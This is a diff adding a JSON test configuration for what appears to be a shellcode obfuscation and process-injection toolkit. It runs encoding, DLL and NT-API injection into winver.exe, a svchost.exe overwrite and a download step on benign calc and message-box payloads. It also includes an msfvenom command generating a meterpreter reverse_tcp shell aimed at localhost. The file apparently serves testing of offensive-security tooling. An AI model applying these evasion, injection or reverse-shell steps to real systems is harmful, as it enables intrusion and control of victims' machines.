@@ -1,0 +1,263 @@
+{
+    "name": "Test Modules",
+    "scheme": "V2",
+    "single_step": null,
+    "tasks": [
+        {
+            "id": "1",
+            "module": "alphanum",
+            "args": {
+                "input": "tests\\calc.raw",
+                "output": "tests\\1-alphanum.bin",
+                "decode": false,
+                "compile": true,
+                "variable_padding": 5
+                },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "2",
+            "module": "bytebert",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "output": "tests\\2-bytebert.bin",
+                "variable_padding": 5,
+                "verbose": true
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "3",
+            "module": "byteswap",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "output": "tests\\3-byteswap.bin",
+                "key": 113
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "4",
+            "module": "dll",
+            "args":
+            {
+                "input": "tests\\MsgBoxDll.dll",
+                "process": "winver.exe",
+                "start_process": true
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "5",
+            "module": "download",
+            "args":
+            {
+                "output": "tests\\5-download.iso",
+                "protocol": "http",
+                "uri": "https://www.nosociety.de/cfe2e896-c087-41ce-a3ed-65b242f849ab.tmp"
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "6",
+            "module": "extract",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "output": "tests\\6-extract.txt",
+                "extract_range": [10,40],
+                "extract_section": null
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "7",
+            "module": "feed",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "output": "tests\\7-feed.txt",
+                "uri": null,
+                "reassemble": false,
+                "feed_author": "Steve Gates",
+                "feed_title": "AppleSoft Developer News",
+                "feed_subtitle": "The insane news blog about more insane things",
+                "feed_uri": "https://www.nosociety.de/blog/"
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "8",
+            "module": "injection",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "start_process": true,
+                "process": "winver.exe",
+                "shellcode": null,
+                "resume_thread": null,
+                "virtual_protect": null
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "9",
+            "module": "msfvenom",
+            "args":
+            {
+                "command_line": "-p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4455 -f raw",
+                "output": "9-msfvenom.bin"
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "10",
+            "module": "multicoder",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "output": "tests\\10-multicoder.bin",
+                "mode": "encode",
+                "algorithm": "rsa",
+                "key": "shenpa$$"
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "11",
+            "module": "ntinjection",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "process": "winver.exe",
+                "start_process": true
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "12",
+            "module": "output",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "syntax": "inspect",
+                "bytes_per_row": 16,
+                "decimal": true,
+                "lines": null,
+                "no_line_break": false,
+                "range": [0, 0],
+                "output": null
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "13",
+            "module": "psoverwrite",
+            "args":
+            {
+                "payload": "tests\\msgbox.exe",
+                "target": "C:\\windows\\system32\\svchost.exe"
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "14",
+            "module": "qrcode",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "output": "tests\\14-qrcode.png",
+                "reverse": false
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "15",
+            "module": "rolhash",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "output": "tests\\15-rolhash.bin",
+                "key": 121
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "16",
+            "module": "subproc",
+            "args":
+            {
+                "command_line": ["dev\\ndisasm.exe", "tests\\calc.raw"]
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "17",
+            "module": "uuid",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "output": "tests\\17-uuid.cpp",
+                "reverse": false
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "18",
+            "module": "uuid",
+            "args":
+            {
+                "input": "tests\\17-uuid.cpp",
+                "output": "tests\\18-uuid.bin",
+                "reverse": true
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "19",
+            "module": "winexec",
+            "args":
+            {
+                "command_line": "whoami /user",
+                "output": "tests\\19-winexec.bin",
+                "debug": true,
+                "random_label": false
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        },
+        {
+            "id": "20",
+            "module": "xorchain",
+            "args":
+            {
+                "input": "tests\\calc.raw",
+                "output": "tests\\20-xorchain.bin",
+                "variable_padding": 5,
+                "compile": true
+            },
+            "input_buffer": false,
+            "return_buffer": false
+        }
+    ]
+}
